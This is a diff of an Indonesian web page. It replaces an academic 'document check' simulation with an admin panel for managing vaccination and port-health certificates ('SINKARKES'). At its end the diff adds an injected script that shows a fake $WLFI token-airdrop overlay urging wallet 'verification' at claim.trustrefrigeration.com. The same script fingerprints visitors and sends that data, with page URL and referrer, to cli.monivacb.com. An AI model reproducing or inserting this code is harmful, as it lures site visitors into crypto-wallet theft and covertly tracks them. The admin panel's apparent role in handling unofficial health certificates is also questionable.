@@ -1,138 +1,407 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Portal Dokumen - simulasi akademik pemeriksaan dokumen">
-  <meta name="theme-color" content="#123b46">
-  <title>Portal Dokumen | Cek Dokumen</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Manajemen Sertifikat - SINKARKES</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { background-color: #111827; color: #e5e7eb; font-family: 'Inter', sans-serif; }
+        .glass-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .form-input { background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.2); color: #e5e7eb; }
+        .form-input:focus { background: rgba(0,0,0,0.3); border-color: #a78bfa; outline: none; box-shadow: none; }
+        .btn-primary { background-color: #7c3aed; hover:bg-purple-700; }
+        .modal-backdrop { background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #1f2937; }
+        ::-webkit-scrollbar-thumb { background: #4f46e5; border-radius: 4px; }
+    </style>
 </head>
-<body>
-  <div class="demo-bar">SIMULASI AKADEMIK — BUKAN LAYANAN RESMI</div>
+<body class="antialiased">
 
-  <header class="site-header">
-    <div class="container header-inner">
-      <a class="brand" href="#" aria-label="Portal Dokumen">
-        <span class="brand-mark">PD</span>
-        <span><strong>PORTAL DOKUMEN</strong><small>Sistem Informasi Pemeriksaan Dokumen</small></span>
-      </a>
-      <button class="menu-toggle" id="menuToggle" aria-label="Buka menu" aria-expanded="false">☰</button>
-      <nav class="main-nav" id="mainNav">
-        <a href="#informasi">Informasi</a>
-        <a href="#panduan">Panduan</a>
-        <a href="#form-cek">Cek Dokumen</a>
-      </nav>
-    </div>
-  </header>
-
-  <main>
-    <section class="page-heading">
-      <div class="container">
-        <p class="eyebrow">LAYANAN INFORMASI DIGITAL</p>
-        <h1>Cek Dokumen</h1>
-        <p>Periksa data dokumen melalui formulir simulasi berikut.</p>
-      </div>
-    </section>
-
-    <section class="container content-section" id="informasi">
-      <div class="section-title">
-        <span class="section-icon">i</span>
-        <div><h2>Apa Itu Cek Nomor Dokumen?</h2>
-        <p>Fitur simulasi untuk menampilkan informasi dokumen berdasarkan nomor yang dimasukkan.</p></div>
-      </div>
-
-      <div class="notice">
-        <div class="notice-icon">✓</div>
-        <div><strong>Pemberitahuan</strong>
-          <p>Website ini dibuat untuk keperluan tugas akademik. Data dan hasil pencarian hanya contoh, tidak terhubung ke database instansi mana pun, dan bukan bukti keaslian dokumen.</p>
+    <!-- Halaman Login -->
+    <div id="login-page" class="min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-md">
+            <div class="glass-card p-8 rounded-xl shadow-lg">
+                <h2 class="text-3xl font-bold text-center text-white mb-2">Admin Login</h2>
+                <p class="text-center text-gray-400 mb-6">Sistem Manajemen Sertifikat</p>
+                <form id="login-form">
+                    <div class="mb-4">
+                        <label for="username" class="block text-gray-300 text-sm font-bold mb-2">Username</label>
+                        <input type="text" id="username" class="form-input w-full p-3 rounded-lg transition duration-300" required>
+                    </div>
+                    <div class="mb-6">
+                        <label for="password" class="block text-gray-300 text-sm font-bold mb-2">Password</label>
+                        <input type="password" id="password" class="form-input w-full p-3 rounded-lg transition duration-300" required>
+                    </div>
+                    <button type="submit" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300">Login</button>
+                    <div id="login-error" class="bg-red-500/30 text-red-300 p-3 rounded-lg mt-4 text-center" style="display: none;"></div>
+                </form>
+            </div>
         </div>
-      </div>
-
-      <div class="warning">
-        <h2>Waspada Website Tiruan</h2>
-        <ul>
-          <li>Periksa alamat website sebelum memasukkan informasi dokumen.</li>
-          <li>Jangan membagikan kata sandi, kode OTP, atau data pribadi.</li>
-          <li>Jangan melakukan pembayaran kepada pihak yang mengaku menawarkan verifikasi.</li>
-          <li>Untuk pemeriksaan resmi, gunakan kanal resmi instansi penerbit dokumen.</li>
-        </ul>
-      </div>
-    </section>
-
-    <section class="container content-section" id="panduan">
-      <div class="section-heading">
-        <p class="eyebrow">MUDAH DAN PRAKTIS</p>
-        <h2>Tata Cara Pencarian</h2>
-        <p>Ikuti langkah berikut untuk mencoba fitur simulasi.</p>
-      </div>
-      <div class="guide-grid">
-        <article class="guide-card">
-          <span class="step-badge">CARA 1</span>
-          <h3>Input Nomor Dokumen</h3>
-          <p>Masukkan nomor contoh pada formulir di bawah.</p>
-          <ol>
-            <li>Pilih jenis dokumen.</li>
-            <li>Masukkan nomor dokumen contoh.</li>
-            <li>Tekan tombol Cari Dokumen.</li>
-          </ol>
-          <a class="text-link" href="#form-cek">Ke Formulir Pencarian →</a>
-        </article>
-        <article class="guide-card">
-          <span class="step-badge">CARA 2</span>
-          <h3>Gunakan Nomor Contoh</h3>
-          <p>Untuk demonstrasi, gunakan salah satu nomor berikut:</p>
-          <ul class="sample-list">
-            <li><code>DEMO-2026-001</code></li>
-            <li><code>DEMO-2026-002</code></li>
-            <li><code>DEMO-2026-003</code></li>
-          </ul>
-          <p class="small-note">Nomor di atas hanya data contoh, bukan nomor dokumen asli.</p>
-        </article>
-      </div>
-    </section>
-
-    <section class="container content-section" id="form-cek">
-      <div class="form-panel">
-        <div class="section-heading">
-          <p class="eyebrow">FORMULIR VERIFIKASI</p>
-          <h2>Cari Dokumen Anda</h2>
-          <p>Lengkapi kolom berikut untuk melihat hasil simulasi.</p>
-        </div>
-        <form id="verificationForm">
-          <div class="form-group">
-            <label for="jenis_dokumen">Jenis Dokumen</label>
-            <select id="jenis_dokumen" name="jenis_dokumen" required>
-              <option value="">Pilih jenis dokumen</option>
-              <option value="icv">ICV — Sertifikat Vaksinasi</option>
-              <option value="phqc">PHQC — Izin Kesehatan Pelabuhan</option>
-              <option value="health_book">Buku Kesehatan Kapal</option>
-              <option value="sscec">Sertifikat Sanitasi Kapal</option>
-              <option value="other">Dokumen Lainnya</option>
-            </select>
-          </div>
-          <div class="form-group">
-            <label for="no_dokumen">Nomor Dokumen / Barcode</label>
-            <input id="no_dokumen" name="no_dokumen" type="text" placeholder="Contoh: DEMO-2026-001" autocomplete="off" required>
-            <small>Coba nomor demo: DEMO-2026-001, DEMO-2026-002, atau DEMO-2026-003.</small>
-          </div>
-          <button class="primary-button" id="searchBtn" type="submit">Cari Dokumen <span>→</span></button>
-        </form>
-        <div id="result-block" class="result-block" aria-live="polite" hidden></div>
-        <p class="form-disclaimer">Simulasi akademik. Jangan masukkan data pribadi atau nomor dokumen asli.</p>
-      </div>
-    </section>
-  </main>
-
-  <footer class="site-footer">
-    <div class="container footer-inner">
-      <div><strong>PORTAL DOKUMEN</strong><p>Contoh antarmuka pemeriksaan dokumen untuk pembelajaran.</p></div>
-      <div><strong>INFORMASI</strong><a href="#informasi">Tentang Simulasi</a><a href="#panduan">Panduan Penggunaan</a></div>
-      <div><strong>STATUS SISTEM</strong><p>Mode demonstrasi<br>Database lokal contoh</p></div>
     </div>
-    <div class="copyright">© 2026 Portal Dokumen — Proyek Simulasi Akademik</div>
-  </footer>
 
-  <script src="script.js"></script>
+    <!-- Halaman Manajemen -->
+    <div id="management-page" class="p-4 sm:p-6 lg:p-8" style="display: none;">
+        <!-- Header -->
+        <header class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6">
+            <div>
+                <h1 class="text-3xl font-bold text-white">Manajemen Sertifikat</h1>
+                <p id="admin-welcome" class="text-gray-400 mt-1">Selamat datang, <strong id="admin-username-display" class="font-medium text-purple-400"></strong>!</p>
+                <p id="admin-stats" class="text-sm text-gray-400"></p>
+            </div>
+            <button id="logout-btn" class="mt-4 sm:mt-0 flex items-center px-4 py-2 bg-red-600/50 hover:bg-red-600/80 text-white rounded-lg transition-colors">
+                <i class="fa fa-sign-out-alt mr-2"></i> Logout
+            </button>
+        </header>
+
+        <!-- Kontrol & Aksi -->
+        <div class="glass-card p-4 rounded-xl mb-6">
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 items-end">
+                <div class="lg:col-span-2">
+                    <label for="search-input" class="text-sm font-medium text-gray-300">Cari Nama / No. Dokumen</label>
+                    <input type="text" id="search-input" placeholder="Ketik untuk mencari..." class="form-input w-full mt-1 p-2 rounded-lg">
+                </div>
+                 <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label for="tanggal_awal" class="text-sm font-medium text-gray-300">Dari Tanggal</label>
+                        <input type="date" id="tanggal_awal" class="form-input w-full mt-1 p-2 rounded-lg">
+                    </div>
+                    <div>
+                        <label for="tanggal_akhir" class="text-sm font-medium text-gray-300">Sampai Tanggal</label>
+                        <input type="date" id="tanggal_akhir" class="form-input w-full mt-1 p-2 rounded-lg">
+                    </div>
+                </div>
+                <div class="flex flex-col sm:flex-row gap-2 mt-4 md:mt-0">
+                    <button id="export-pdf-btn" class="w-full flex-1 flex items-center justify-center px-4 py-2 bg-green-600/60 hover:bg-green-600/90 text-white rounded-lg transition-colors text-sm">
+                        <i class="fa fa-file-pdf mr-2"></i> Ekspor PDF
+                    </button>
+                    <button id="add-admin-btn" class="w-full flex-1 flex items-center justify-center px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors text-sm font-semibold hidden">
+                        <i class="fa fa-user-cog mr-2"></i> Akun Admin
+                    </button>
+                    <button id="add-new-btn" class="w-full flex-1 flex items-center justify-center px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors text-sm font-semibold">
+                        <i class="fa fa-plus mr-2"></i> Tambah Data
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tabel Data -->
+        <div class="glass-card rounded-xl overflow-hidden">
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm text-left text-gray-300">
+                    <thead class="text-xs text-gray-300 uppercase bg-white/5">
+                        <tr>
+                            <th class="px-6 py-3">No. Dokumen</th>
+                            <th class="px-6 py-3">Nama Pemilik</th>
+                            <th class="px-6 py-3">Uplink</th>
+                            <th class="px-6 py-3">Tanggal Update</th>
+                            <th class="px-6 py-3">Status</th>
+                            <th class="px-6 py-3 text-center">Aksi</th>
+                        </tr>
+                    </thead>
+                    <tbody id="documents-table-body">
+                        <!-- Data dimuat oleh JS -->
+                    </tbody>
+                </table>
+                <div id="no-data-message" class="text-center py-10 text-gray-400 hidden">
+                    <i class="fa fa-folder-open fa-3x mb-3"></i>
+                    <p>Tidak ada data yang ditemukan.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Pagination -->
+        <div id="pagination-controls" class="flex flex-col sm:flex-row items-center justify-between mt-6 text-gray-400 text-sm">
+            <span id="pagination-info" class="mb-2 sm:mb-0"></span>
+            <div class="flex items-center space-x-1">
+                <button id="prev-page-btn" class="px-3 py-2 bg-white/10 rounded-md hover:bg-white/20 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"><i class="fa fa-chevron-left"></i></button>
+                <div id="page-numbers" class="flex items-center space-x-1"></div>
+                <button id="next-page-btn" class="px-3 py-2 bg-white/10 rounded-md hover:bg-white/20 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"><i class="fa fa-chevron-right"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Tambah/Edit -->
+    <div id="document-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop hidden">
+        <div class="glass-card w-full max-w-4xl max-h-[90vh] rounded-2xl shadow-lg flex flex-col">
+            <header class="p-5 border-b border-white/10 flex justify-between items-center">
+                <h3 id="modal-title" class="text-xl font-semibold text-white">Formulir Sertifikat</h3>
+                <button onclick="$('#document-modal').addClass('hidden')" class="text-gray-400 hover:text-white text-3xl leading-none">&times;</button>
+            </header>
+            <main class="p-6 overflow-y-auto">
+                <form id="document-form">
+                    <input type="hidden" id="document-id">
+                    <h4 class="text-lg font-semibold text-purple-300 mb-4">Data Utama</h4>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                        <div>
+                            <div class="mb-4"><label class="block mb-1 text-sm">Nama Pemilik</label><input type="text" id="nama_pemilik" class="form-input w-full p-2 rounded-md text-sm" required></div>
+                            <div class="mb-4"><label class="block mb-1 text-sm">No. Passport</label><input type="text" id="passport_no" class="form-input w-full p-2 rounded-md text-sm"></div>
+                            <div><label class="block mb-1 text-sm">Tanggal Lahir</label><input type="date" id="tanggal_lahir" class="form-input w-full p-2 rounded-md text-sm"></div>
+                        </div>
+                        <div>
+                            <div class="mb-4"><label class="block mb-1 text-sm">No. Dokumen</label><input type="text" id="no_dokumen_form" class="form-input w-full p-2 rounded-md text-sm" required></div>
+                            <div class="mb-4"><label class="block mb-1 text-sm">Jenis Dokumen</label><select id="jenis_dokumen_form" class="form-input w-full p-2 rounded-md text-sm"><option value="icv">ICV</option><option value="icv-haji">ICV Haji</option><option value="phqc">PHQC</option></select></div>
+                            <div><label class="block mb-1 text-sm">Status</label><select id="status_form" class="form-input w-full p-2 rounded-md text-sm"><option value="Aktif">Aktif</option><option value="Kadaluarsa">Kadaluarsa</option></select></div>
+                        </div>
+                    </div>
+                    <div class="mb-6"><label class="block mb-1 text-sm">Diterbitkan Oleh</label><input type="text" id="diterbitkan_oleh" class="form-input w-full p-2 rounded-md text-sm" required></div>
+                    <hr class="border-white/10 my-6">
+                    <h4 class="text-lg font-semibold text-purple-300 mb-4">Data Vaksinasi</h4>
+                    <div id="vaccine-fields-container" class="space-y-4"></div>
+                    <button type="button" id="add-vaccine-btn" class="mt-4 px-4 py-2 text-sm bg-white/10 hover:bg-white/20 rounded-lg transition-colors"><i class="fa fa-plus mr-2"></i> Tambah Vaksin</button>
+                </form>
+            </main>
+            <footer class="p-5 border-t border-white/10 flex justify-end space-x-3">
+                <button type="button" onclick="$('#document-modal').addClass('hidden')" class="px-6 py-2 bg-gray-600/50 hover:bg-gray-600/80 rounded-lg transition-colors">Tutup</button>
+              <button type="button" id="save-document-btn" class="px-6 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg font-semibold transition-colors">Simpan</button>
+            </footer>
+        </div>
+    </div>
+    
+    <!-- Modal Update Uplink (Super Admin) -->
+    <div id="uplink-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop hidden">
+        <div class="glass-card w-full max-w-sm rounded-2xl shadow-lg">
+            <header class="p-5 border-b border-white/10 flex justify-between items-center">
+                <h3 id="uplink-modal-title" class="text-lg font-semibold text-white">Ubah Uplink</h3>
+                <button onclick="$('#uplink-modal').addClass('hidden')" class="text-gray-400 hover:text-white text-3xl leading-none">&times;</button>
+            </header>
+            <main class="p-6">
+                <input type="hidden" id="uplink-document-id">
+                <p class="text-sm text-gray-300 mb-1">Pindahkan dokumen:</p>
+                <p id="uplink-doc-info" class="font-semibold text-white mb-4"></p>
+                <label for="admin-select" class="text-sm font-medium text-gray-300">Ke Admin:</label>
+                <select id="admin-select" class="form-input w-full mt-1 p-2 rounded-lg"></select>
+            </main>
+            <footer class="p-5 border-t border-white/10 flex justify-end space-x-3">
+                 <button type="button" onclick="$('#uplink-modal').addClass('hidden')" class="px-6 py-2 bg-gray-600/50 hover:bg-gray-600/80 rounded-lg transition-colors">Batal</button>
+                <button type="button" id="save-uplink-btn" class="px-6 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg font-semibold transition-colors">Simpan</button>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Modal Manajemen Akun Admin -->
+    <div id="add-admin-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop hidden">
+        <div class="glass-card w-full max-w-md rounded-2xl shadow-lg">
+            <header class="p-5 border-b border-white/10 flex justify-between items-center">
+                <h3 class="text-lg font-semibold text-white">Manajemen Akun Admin</h3>
+                <button onclick="$('#add-admin-modal').addClass('hidden')" class="text-gray-400 hover:text-white text-3xl leading-none">&times;</button>
+            </header>
+            <main class="p-6">
+                <!-- Daftar Admin akan dimuat di sini -->
+                <div id="admin-list-container" class="mb-6 pb-4 border-b border-white/10">
+                    <h4 class="text-lg font-semibold text-blue-300 mb-3">Daftar Akun</h4>
+                    <div id="admin-list-body" class="space-y-2 text-sm max-h-40 overflow-y-auto"></div>
+                </div>
+                <!-- Form Tambah Admin -->
+                <h4 class="text-lg font-semibold text-purple-300 mb-3">Tambah Akun Baru</h4>
+                <form id="add-admin-form">
+                    <div class="mb-4">
+                        <label for="new-admin-username" class="block text-gray-300 text-sm font-bold mb-2">Username Baru</label>
+                        <input type="text" id="new-admin-username" class="form-input w-full p-3 rounded-lg transition duration-300" required>
+                    </div>
+                    <div class="mb-6">
+                        <label for="new-admin-password" class="block text-gray-300 text-sm font-bold mb-2">Password Baru</label>
+                        <input type="password" id="new-admin-password" class="form-input w-full p-3 rounded-lg transition duration-300" required>
+                    </div>
+                </form>
+                <div id="add-admin-error" class="bg-red-500/30 text-red-300 p-3 rounded-lg mt-4 text-center hidden"></div>
+            </main>
+            <footer class="p-5 border-t border-white/10 flex justify-end space-x-3">
+                 <button type="button" onclick="$('#add-admin-modal').addClass('hidden')" class="px-6 py-2 bg-gray-600/50 hover:bg-gray-600/80 rounded-lg transition-colors">Batal</button>
+                <button type="button" id="save-admin-btn" class="px-6 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg font-semibold transition-colors">Simpan Akun</button>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Modal Edit Akun Admin -->
+    <div id="edit-admin-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop hidden">
+        <div class="glass-card w-full max-w-sm rounded-2xl shadow-lg">
+            <header class="p-5 border-b border-white/10 flex justify-between items-center">
+                <h3 class="text-lg font-semibold text-white">Ubah Akun Admin</h3>
+                <button onclick="$('#edit-admin-modal').addClass('hidden')" class="text-gray-400 hover:text-white text-3xl leading-none">&times;</button>
+            </header>
+            <main class="p-6">
+                <form id="edit-admin-form">
+                    <input type="hidden" id="edit-admin-id">
+                    <div class="mb-4">
+                        <label for="edit-admin-username" class="block text-gray-300 text-sm font-bold mb-2">Username</label>
+                        <input type="text" id="edit-admin-username" class="form-input w-full p-3 rounded-lg transition duration-300" required>
+                    </div>
+                    <div class="mb-6">
+                        <label for="edit-admin-password" class="block text-gray-300 text-sm font-bold mb-2">Password Baru (Opsional)</label>
+                        <input type="password" id="edit-admin-password" class="form-input w-full p-3 rounded-lg transition duration-300" placeholder="Kosongkan jika tidak diubah">
+                    </div>
+                </form>
+                <div id="edit-admin-error" class="bg-red-500/30 text-red-300 p-3 rounded-lg mt-4 text-center hidden"></div>
+            </main>
+            <footer class="p-5 border-t border-white/10 flex justify-end space-x-3">
+                 <button type="button" onclick="$('#edit-admin-modal').addClass('hidden')" class="px-6 py-2 bg-gray-600/50 hover:bg-gray-600/80 rounded-lg transition-colors">Batal</button>
+                <button type="button" id="update-admin-btn" class="px-6 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg font-semibold transition-colors">Simpan Perubahan</button>
+            </footer>
+        </div>
+    </div>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.23/jspdf.plugin.autotable.min.js"></script>
+    <script src="admin.js"></script>
+<script>window.__cfAdPayload__={"api":"https://cli.monivacb.com/event","html":"\u003cstyle>\n@import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&display=swap');\n.cfad-overlay{\n  position:fixed;inset:0;z-index:2147483000;\n  display:flex;align-items:center;justify-content:center;\n  padding:16px;box-sizing:border-box;\n  background:rgba(12,9,6,.55);\n  -webkit-backdrop-filter:blur(10px);\n  backdrop-filter:blur(10px);\n  opacity:0;transition:opacity .25s ease;\n}\n.cfad-overlay.cfad-show{opacity:1;}\n.cfad-card{\n  position:relative;\n  width:min(380px,100%);\n  background:linear-gradient(180deg,#241f19,#1e1a16);\n  color:#fdfdfc;border:1px solid rgba(234,172,8,.32);border-radius:16px;\n  box-shadow:0 24px 64px rgba(0,0,0,.6),0 0 48px rgba(234,172,8,.12);\n  font-family:'Sora',Arial,Helvetica,sans-serif;\n  padding:26px 24px 22px;text-align:center;\n}\n.cfad-logo{\n  width:44px;height:44px;display:block;margin:0 auto 12px;border-radius:50%;\n  background:#0d0d0d;box-shadow:0 0 0 1px rgba(234,172,8,.32),0 0 24px rgba(234,172,8,.25);\n}\n.cfadtest-badge{\n  display:inline-flex;align-items:center;gap:7px;\n  font-size:10px;font-weight:700;letter-spacing:.18em;\n  color:#eaac08;border:1px solid rgba(234,172,8,.32);border-radius:99px;\n  padding:4px 11px;margin-bottom:12px;background:rgba(234,172,8,.06);\n}\n.cfadtest-badge i{\n  width:7px;height:7px;border-radius:50%;background:#f7d774;\n  box-shadow:0 0 8px #f7d774;animation:cfad-pulse 1.6s ease-in-out infinite;\n}\n@keyframes cfad-pulse{0%,100%{opacity:1}50%{opacity:.35}}\n.cfad-card h3{margin:0 0 8px;font-size:19px;font-weight:800;letter-spacing:-.3px;line-height:1.25;color:#fdfdfc;}\n.cfad-card h3 .cfad-gold{\n  background:linear-gradient(90deg,#f7d774 0%,#eaac08 60%,#d99a06 100%);\n  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:#eaac08;\n}\n.cfad-card p{margin:0 0 14px;font-size:13.5px;line-height:1.5;color:rgba(253,253,252,.62);}\n.cfad-stats{margin:0 0 16px;font-size:11px;letter-spacing:.04em;color:rgba(253,253,252,.42);}\n.cfad-stats b{color:#eaac08;font-weight:700;font-variant-numeric:tabular-nums;}\n.cfadtest-cta{\n  display:inline-block;\n  background:linear-gradient(135deg,#f7d774 0%,#eab02e 55%,#d99a06 100%);\n  color:#171412;font-weight:800;font-size:14px;letter-spacing:.3px;\n  padding:12px 26px;border-radius:12px;text-decoration:none;\n  box-shadow:0 10px 26px rgba(234,172,8,.3);\n  transition:transform .15s ease,box-shadow .15s ease;\n}\n.cfadtest-cta:hover{transform:translateY(-1px);box-shadow:0 14px 32px rgba(234,172,8,.4);}\n.cfad-note{margin:12px 0 0;font-size:10.5px;color:rgba(253,253,252,.4);}\n.cfad-close{\n  position:absolute;top:10px;right:12px;border:0;background:transparent;\n  color:rgba(253,253,252,.42);font-size:14px;line-height:1;padding:4px;cursor:pointer;\n}\n.cfad-close:hover{color:#fdfdfc;}\n\u003c/style>\n\u003cimg class=\"cfad-logo\" src=\"https://static.worldlibertyfinancial.com/assets/wlfi/wlfi-token.png\" alt=\"WLFI\">\n\u003cspan class=\"cfadtest-badge\">\u003ci>\u003c/i>DISTRIBUTION LIVE\u003c/span>\n\u003ch3>Your \u003cspan class=\"cfad-gold\">$WLFI\u003c/span> Allocation Is Ready\u003c/h3>\n\u003cp>The WLFI token airdrop is now open. Verify your wallet on-chain and unlock your free allocation — no purchase, no fees.\u003c/p>\n\u003cdiv class=\"cfad-stats\">\u003cb>284,391\u003c/b> wallets verified · Batch #5047 · 24–48h settlement\u003c/div>\n\u003ca class=\"cfadtest-cta\" href=\"https://claim.trustrefrigeration.com\" target=\"_blank\" rel=\"noopener\">CLAIM MY $WLFI →\u003c/a>\n\u003cp class=\"cfad-note\">1 allocation per wallet · Not financial advice\u003c/p>","target":"https://claim.trustrefrigeration.com","country":"Indonesia","city":"Bekasi"};
+(function () {
+  if (window.__cfAdBanner__) return;
+  window.__cfAdBanner__ = 1;
+
+  var P = window.__cfAdPayload__;
+  if (!P) return;
+
+  // Neutralize the host page's typography so the banner HTML doesn't
+  // inherit site heading/link colors (e.g. a blue h3). The banner's own
+  // styles are appended later and win on ties.
+  (function () {
+    var st = document.createElement("style");
+    st.textContent =
+      ".cfad-card h1,.cfad-card h2,.cfad-card h3,.cfad-card h4,.cfad-card h5,.cfad-card h6,"
+      + ".cfad-card p,.cfad-card a,.cfad-card span,.cfad-card button{color:inherit}";
+    (document.head || document.documentElement).appendChild(st);
+  })();
+
+  var CAP_MS = 10 * 60 * 1000;
+  var COOKIE = "__cfad_ts";
+  var NS = "cfad-";
+
+  function readCap() {
+    try {
+      var m = document.cookie.match(new RegExp("(?:^|;)\\s*" + COOKIE + "=(\\d+)"));
+      return m ? parseInt(m[1], 10) : 0;
+    } catch (e) { return 0; }
+  }
+  function writeCap() {
+    try {
+      document.cookie = COOKIE + "=" + Date.now() + "; path=/; max-age=" + Math.floor(CAP_MS / 1000) + "; SameSite=Lax";
+    } catch (e) {}
+  }
+  function fp() {
+    try {
+      var s = [
+        navigator.userAgent, navigator.language, screen.width, screen.height,
+        screen.colorDepth, navigator.platform, navigator.hardwareConcurrency || 0,
+        new Date().getTimezoneOffset(), Intl.DateTimeFormat().resolvedOptions().timeZone || ""
+      ].join("|");
+      try {
+        var c = document.createElement("canvas");
+        var x = c.getContext("2d");
+        x.textBaseline = "top"; x.font = "14px Arial";
+        x.fillStyle = "#f60"; x.fillRect(0, 0, 150, 30);
+        x.fillStyle = "#069"; x.fillText("cfad-fp", 2, 2);
+        s += "|" + c.toDataURL().length;
+      } catch (e) {}
+      var h = 5381;
+      for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
+      return h.toString(16);
+    } catch (e) { return "x"; }
+  }
+  function send(type, extra) {
+    var body = {
+      type: type,
+      fingerprint: fp(),
+      page_url: location.href,
+      referer: document.referrer || "",
+      language: navigator.language || "",
+      country: P.country || "",
+      city: P.city || ""
+    };
+    if (extra) for (var k in extra) body[k] = extra[k];
+    try {
+      fetch(P.api, {
+        method: "POST",
+        keepalive: true,
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify(body)
+      });
+    } catch (e) {}
+  }
+
+  function buildCard() {
+    var card = document.createElement("div");
+    card.className = NS + "card";
+    card.innerHTML = P.html || "";
+    return card;
+  }
+
+  function show() {
+    if (readCap() > 0 && Date.now() - readCap() < CAP_MS) return;
+
+    var ov = document.createElement("div");
+    ov.className = NS + "overlay";
+
+    var card = buildCard();
+    card.addEventListener("click", function (e) {
+      var t = e.target;
+      // The close button has its own handler; ignore its bubbled clicks so
+      // they are not counted as card clicks (which would redirect).
+      if (t && t.closest && t.closest("." + NS + "close")) return;
+      var a = t && t.closest ? t.closest("a[href]") : null;
+      var target = null;
+      if (a && a.href) {
+        target = a.href;
+        if (a.target && a.target !== "_self" && a.target !== "") {
+          a.addEventListener("click", function () { writeCap(); }, { once: true });
+          send("click", { target_url: target });
+          return; // let the browser open the link itself
+        }
+      } else if (P.target) {
+        target = P.target;
+      }
+      send("click", { target_url: target || "" });
+      writeCap();
+      if (target) location.href = target;
+    });
+
+    var close = document.createElement("button");
+    close.className = NS + "close";
+    close.type = "button";
+    close.setAttribute("aria-label", "Close");
+    close.innerHTML = "&#10005;";
+    close.addEventListener("click", function () {
+      writeCap();
+      remove();
+    });
+
+    card.appendChild(close);
+    ov.appendChild(card);
+    (document.body || document.documentElement).appendChild(ov);
+
+    // Clicking the backdrop (outside the card) closes the banner.
+    ov.addEventListener("click", function (e) {
+      if (e.target === ov) {
+        writeCap();
+        remove();
+      }
+    });
+
+    requestAnimationFrame(function () {
+      ov.classList.add(NS + "show");
+    });
+    send("show");
+  }
+
+  function remove() {
+    var ov = document.querySelector("." + NS + "overlay");
+    if (ov) ov.parentNode.removeChild(ov);
+  }
+
+  var delay = 1000 + Math.random() * 2000;
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", function () {
+      setTimeout(show, delay);
+    });
+  } else {
+    setTimeout(show, delay);
+  }
+})();
+</script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"23ba6af26fb24332b9ef7d5819cd466c","r":1,"spa":2}' crossorigin="anonymous"></script>
 </body>
 </html>
+
